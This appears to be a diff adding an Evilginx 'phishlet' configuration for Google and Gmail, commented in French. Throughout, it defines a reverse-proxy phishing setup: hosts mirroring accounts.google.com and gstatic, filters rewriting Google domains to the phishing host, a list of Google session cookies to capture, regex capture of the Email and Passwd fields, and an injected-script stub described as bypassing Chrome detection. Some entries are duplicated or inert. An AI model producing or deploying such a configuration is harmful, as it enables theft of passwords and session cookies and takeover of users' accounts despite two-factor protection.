@@ -1,0 +1,236 @@
+##########################################################
+# PHISHLET GOOGLE/GMAIL - EVILGINX PRO
+# Structure complète d'un phishlet pour Google Authentication
+##########################################################
+
+name: "google"
+author: "@breakdev"
+min_ver: "3.0.0"
+
+##########################################################
+# PROXY HOSTS - Configuration des hôtes à proxifier
+##########################################################
+proxy_hosts:
+  # Hôte principal d'authentification Google
+  - {
+      phish_sub: "accounts",
+      orig_sub: "accounts",
+      domain: "google.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+
+  # APIs et ressources nécessaires pour l'authentification
+  - {
+      phish_sub: "accounts",
+      orig_sub: "accounts",
+      domain: "google.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "accounts",
+      orig_sub: "gds",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "ssl",
+      orig_sub: "ssl",
+      domain: "gstatic.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "gstatic.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "fonts",
+      orig_sub: "fonts",
+      domain: "gstatic.com",
+      session: false,
+      is_landing: false,
+    }
+
+  # Google APIs
+  - {
+      phish_sub: "apis",
+      orig_sub: "apis",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "content",
+      orig_sub: "content",
+      domain: "googleapis.com",
+      session: false,
+      is_landing: false,
+    }
+
+  # Ressources statiques
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+    }
+
+##########################################################
+# SUB FILTERS - Remplacement de domaines dans les réponses
+##########################################################
+sub_filters:
+  # Remplacer tous les domaines Google par le domaine de phishing
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "accounts",
+      domain: "google.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "accounts",
+      domain: "google.com",
+      search: "accounts.google.com",
+      replace: "{hostname}",
+      mimes: ["text/html", "application/json"],
+    }
+
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "www",
+      domain: "google.com",
+      search: "www.google.com",
+      replace: "{hostname}",
+      mimes: ["text/html"],
+    }
+
+  # Filtres pour les ressources statiques
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "ssl",
+      domain: "gstatic.com",
+      search: "ssl.gstatic.com",
+      replace: "{hostname}",
+      mimes: ["text/html", "text/css", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "www",
+      domain: "gstatic.com",
+      search: "www.gstatic.com",
+      replace: "{hostname}",
+      mimes: ["text/html"],
+    }
+
+##########################################################
+# AUTH TOKENS - Cookies de session à capturer
+##########################################################
+auth_tokens:
+  # Cookies de session Google critiques
+  - domain: ".google.com"
+    keys: ["SID", "SSID", "APISID", "SAPISID", "HSID"]
+
+  # Cookies d'authentification OAuth
+  - domain: ".google.com"
+    keys:
+      [
+        "__Secure-1PSID",
+        "__Secure-1PAPISID",
+        "__Secure-3PSID",
+        "__Secure-3PAPISID",
+      ]
+
+  # Cookies de session persistants
+  - domain: ".google.com"
+    keys: ["ACCOUNT_CHOOSER", "LSID", "NID"]
+
+##########################################################
+# CREDENTIALS - Champs de capture des identifiants
+##########################################################
+credentials:
+  # Capture de l'adresse email
+  username:
+    key: "Email"
+    search: "(.*)"
+    type: "post"
+
+  # Capture du mot de passe
+  password:
+    key: "Passwd"
+    search: "(.*)"
+    type: "post"
+
+##########################################################
+# LOGIN - Configuration de la page de connexion
+##########################################################
+login:
+  # Domaine et chemin de la page de connexion
+  domain: "accounts.google.com"
+  path: "/ServiceLogin"
+
+##########################################################
+# FORCE POST - Forcer les paramètres POST (optionnel)
+##########################################################
+force_post:
+  - path: "/signin/v2/challenge/password"
+    search:
+      - { key: "Email", search: "(.*)" }
+      - { key: "Passwd", search: "(.*)" }
+    force:
+      - { key: "Email", value: "{Email}" }
+      - { key: "Passwd", value: "{Passwd}" }
+    type: "post"
+
+##########################################################
+# JS INJECT - Injection JavaScript (optionnel - Pro)
+##########################################################
+js_inject:
+  # Injection sur la page de login
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths:
+      [
+        "/ServiceLogin",
+        "/signin/v2/identifier",
+        "/signin/v2/challenge/password",
+      ]
+    trigger_params: []
+    script: |
+      // Script personnalisé pour manipulation DOM ou contournement
+      console.log('Evilginx phishing active');
+
+      // Exemple: Désactiver certaines protections
+      if (typeof window.chrome !== 'undefined') {
+        // Code pour contourner la détection Chrome
+      }
+
+##########################################################
+# AUTH URLS - URLs d'authentification à surveiller
+##########################################################
+auth_urls:
+  - "/ServiceLogin"
+  - "/signin/v2/identifier"
+  - "/signin/v2/challenge"
+  - "/signin/v2/challenge/password"
+  - "/signin/oauth"
+  - "/o/oauth2/auth"
+
+##########################################################
+# LANDING URLS - URLs de destination après auth
+##########################################################
+landing_urls:
+  - "/myaccount"
+  - "/mail"
+  - "https://mail.google.com"
+  - "https://drive.google.com"
